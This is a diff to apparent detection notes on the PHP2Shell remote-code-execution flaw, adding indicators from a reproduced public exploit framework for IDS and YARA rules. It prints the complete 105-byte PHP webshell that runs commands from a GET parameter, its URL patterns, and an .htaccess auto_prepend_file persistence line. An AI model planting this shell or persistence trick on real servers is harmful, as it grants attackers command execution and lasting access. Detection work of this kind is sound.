@@ -65,3 +65,19 @@ Calif `calif.io/php2shell.x/` · Wiz `wiz.io/blog/php2shell-php-rce` · php.net 
 `php.net/archive/2026.php#2026-10-21-5` · GHSA-w8hw-w9fx-j79w · GHSA-6wmf-4rv5-p3rp ·
 `php2shell.com` · vendor detections from Cloudflare, Corelight, CrowdStrike, Unit 42,
 Cisco Talos, Imperva, Akamai.
+
+### 2026-10-24 addition — public exploit artefacts (SIDs 2202610116/117, YARA PHP2Shell_Joas_Webshell_105B)
+
+A public exploit framework (`JoasASantos/php2shell-exploit`) was reproduced by us on 2026-10-24
+(single-worker Apache prefork, `display_errors=Off`). Its artefacts are nameable:
+
+| Artefact | Value |
+|---|---|
+| Webshell paths | `/.p2s.php`, `/assets/.p2s.php`, `/tmp/.p2s.php`; v2: `/tmp/.p2s_v2.php` |
+| Execution | `GET /.p2s.php?c=<command>` |
+| Self-delete | `GET /.p2s.php?rm=1` → prints `removed` |
+| Webshell body (105 bytes) | `<?php if(isset($_GET["c"])){system($_GET["c"]);}if(isset($_GET["rm"])){unlink(__FILE__);echo"removed";}?>` |
+| v2 persistence | `.htaccess` containing `php_value auto_prepend_file "/tmp/.p2s_v2.php"` |
+
+The `*.p2s.php` URI rule is high-fidelity and low-noise; the response-body rule catches the shell
+being served; the YARA rule catches the file on disk even if renamed (3-of-4 string condition).
